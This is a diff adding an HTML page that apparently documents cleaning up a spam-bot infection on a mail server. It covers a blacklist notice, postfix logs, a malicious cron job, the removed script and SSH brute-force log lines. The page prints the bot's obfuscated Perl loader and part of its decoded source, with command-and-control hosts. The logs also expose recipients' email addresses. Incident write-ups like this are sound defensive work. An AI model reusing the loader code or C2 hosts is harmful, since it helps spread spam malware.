@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+
+
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <title>BotNet ?</title>
+    <link rel="stylesheet" href="../../../static/css/base.css" />
+    <style>
+      img {
+        width: 50%;
+      }
+    </style>
+    <link rel="icon" type="image/png" href="../../../static/logo/favicon.ico">
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="text-left">
+      <div class="status">
+        <h3>Spam check: http://www.uceprotect.net/en/rblcheck.php?ipr=$IP</h3>
+        <pre>
+What does it mean to be listed at the UCEPROTECT-Level 1?
+It means abusive activity was seen from IP $IP directly within the last 7 days.
+
+Concrete allegation:
+IP $IP tried to deliver mail to spamtraps.</pre>
+      <div>
+
+      <div class="app_check">
+        <h3>Mail logs: /var/log/maillog</h3>
+        <pre>
+[$USER@$HOST ~]# ls -lah /var/log/maillog
+-rw------- 1 $USER $USER 389M May  5 16:38 /var/log/maillog
+[$USER@$HOST ~]#
+[$USER@$HOST ~]# tail /var/log/maillog
+...
+May  5 16:38:12 $HOST postfix/error[23503]: BFB7D5C5B: to=<tootiebaby95@aol.com>, relay=none, delay=113860, delays=113860/0/0/0.02, dsn=4.4.2, status=deferred
+May  5 16:38:12 $HOST postfix/error[23444]: B1F795B2F: to=<hevthomson@aol.com>, relay=none, delay=126392, delays=126392/0/0/0.01, dsn=4.4.2, status=deferred
+May  5 16:38:12 $HOST postfix/error[23508]: B43325D1C: to=<seriated@aol.com>, relay=none, delay=109668, delays=109668/0/0/0.01, dsn=4.4.2, status=deferred
+May  5 16:38:12 $HOST postfix/error[23484]: B7C3D5D1D: to=<sggdse@aol.com>, relay=none, delay=109668, delays=109668/0/0/0.01, dsn=4.4.2, status=deferred
+  (delivery temporarily suspended: lost connection with mx-aol.mail.gm0.yahoodns.net[98.136.96.92] while sending RCPT TO)
+...</pre>
+      </div>
+
+      <div class="shutdown_app">
+        <h3>Stopping the `postfix` application</h3>
+        <pre>
+[$USER@$HOST ~]# service postfix stop
+[$USER@$HOST ~]# chkconfig postfix off
+[$USER@$HOST ~]# chkconfig --list postfix
+postfix         0:off   1:off   2:off   3:off   4:off   5:off   6:off</pre>
+      </div>
+
+      <div class="app_runner">
+        <h3>Looking for an application that sending a messages</h3>
+        <pre>
+[$USER@$HOST ~]# vim /var/log/cron
+...
+25104 May  4 18:49:01 $USER CROND[14064]: ($USER) CMD (perl /var/tmp/LcRVzNke >/dev/null 2>&1)¬
+...
+
+[$USER@$HOST ~]# crontab -l
+*/7 * * * * perl /var/tmp/LcRVzNke >/dev/null 2>&1</pre>
+      </div>
+
+      <div class="app_content">
+        <h3>What is this script for?</h3>
+        <pre>
+[$USER@$HOST ~]# cat /var/tmp/LcRVzNke
+my $HyAZMgSzvm='';$HyAZMgSzvm.=$_ while(<DATA>);$HyAZMgSzvm=unpack('u*',$HyAZMgSzvm);$HyAZMgSzvm=~s/295c445c5f495f5f4548533c3c3c3d29/7e797f7f786969607f226f6361233834/gs;eval($HyAZMgSzvm);
+__DATA__
+M(R$O=7-R+V)I;B]P97)L("UW"G5S92!S=')I8W0["G5S92!03U-)6#L*=7-E
+M($E/.CI3;V-K970["G5S92!)3SHZ4V5L96-T.PHD?"`](#$[("9M86EN*"D[
+...
+
+[$USER@$HOST ~]# sed s/eval/print/ /var/tmp/LcRVzNke
+[$USER@$HOST ~]# perl /var/tmp/LcRVzNke
+#!/usr/bin/perl -w
+use strict;
+use POSIX;
+use IO::Socket;
+use IO::Select;
+$| = 1; &main();
+sub main
+{
+exit 0 unless defined (my $pid = fork);
+exit 0 if $pid;
+POSIX::setsid();
+$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM CHLD));
+umask 0;
+chdir "/";
+open (STDIN, "</dev/null");
+open (STDOUT, ">/dev/null");
+open (STDERR, ">&STDOUT");
+my $url = ["5.135.42.98:80","sakurajshtml.org:80","treesnosfx.com:443","libertymovmx.net:80"];
+...</pre>
+      </div>
+
+      <div class="remove_app">
+        <h3>Removing the script</h3>
+        <pre>
+[$USER@$HOST ~]# rm -f /var/tmp/LcRVzNke
+[$USER@$HOST ~]# service crond reload
+Reloading crond:                                           [  OK  ]</pre>
+      </div>
+
+      </div>
+      <div class="security_logs">
+        <h3>Leaked password ? (Have I Been Pwned)</h3>
+        <pre>
+[$USER@$HOST ~]# vim /var/log/secure
+...
+May  5 00:04:21 $HOST sshd[3102]: Invalid user admin from 5.255.113.11¬
+May  5 00:04:21 $HOST sshd[3103]: input_userauth_request: invalid user admin¬
+May  5 00:04:21 $HOST sshd[3102]: pam_unix(sshd:auth): check pass; user unknown¬
+May  5 00:04:21 $HOST sshd[3102]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=5.255.113.11·¬
+May  5 00:04:21 $HOST sshd[3102]: pam_succeed_if(sshd:auth): error retrieving information about user admin¬
+May  5 00:04:21 $HOST sshd[3098]: Failed password for shutdown from 36.67.154.13 port 44440 ssh2¬
+May  5 00:04:22 $HOST sshd[3099]: Received disconnect from 36.67.154.13: 11: Bye Bye¬
+...
+
+[$USER@$HOST ~]# passwd $USER</pre>
+      </div>
+
+    </div>
+  </body>
+
+</html>
